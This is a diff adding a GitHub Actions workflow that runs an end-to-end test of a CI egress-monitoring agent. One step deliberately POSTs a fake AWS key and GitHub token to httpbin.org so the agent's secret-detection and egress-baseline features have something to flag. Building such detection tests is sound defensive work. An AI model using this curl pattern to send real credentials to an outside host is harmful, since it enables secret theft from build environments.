@@ -1,0 +1,54 @@
+name: ROC Agent E2E Test
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+    paths:
+      - '.github/workflows/roc-test.yml'
+
+jobs:
+  roc-test:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Start ROC Agent
+        id: roc
+        uses: o3security/roc-agent@v1
+        with:
+          server_url: https://api.o3.security/graphql
+          api_key: ${{ secrets.ROC_API_KEY }}
+          project_name: ${{ github.repository }}
+          print_only: "false"
+          debug: "true"
+
+      - name: Wait for ROC to initialize
+        run: sleep 12
+
+      - name: Generate normal build traffic
+        run: |
+          echo "ROC PID: ${{ steps.roc.outputs.roc_pid }}"
+          # Normal egress — package registry + GitHub (should be baseline/trusted)
+          curl -s -o /dev/null https://registry.npmjs.org/ || true
+          curl -s -o /dev/null https://api.github.com/ || true
+
+      - name: Exfiltrate a fake secret over TLS (detection target)
+        run: |
+          # Plant a fake AWS key + GitHub token and POST them to an unusual
+          # destination so ROC's DPI secret-detection + egress-baseline have
+          # something to catch. These are NOT real credentials.
+          FAKE_AWS="AKIAIOSFODNN7EXAMPLE"
+          FAKE_GH="ghp_1234567890abcdefghijklmnopqrstuvwxyz"
+          curl -s -o /dev/null -X POST "https://httpbin.org/post" \
+            -H "Content-Type: application/json" \
+            -d "{\"aws_key\":\"${FAKE_AWS}\",\"github_token\":\"${FAKE_GH}\"}" || true
+          # Unusual destination (new egress dest for baseline deviation)
+          curl -s -o /dev/null https://example.com/ || true
+
+      - name: Let ROC capture
+        run: sleep 8
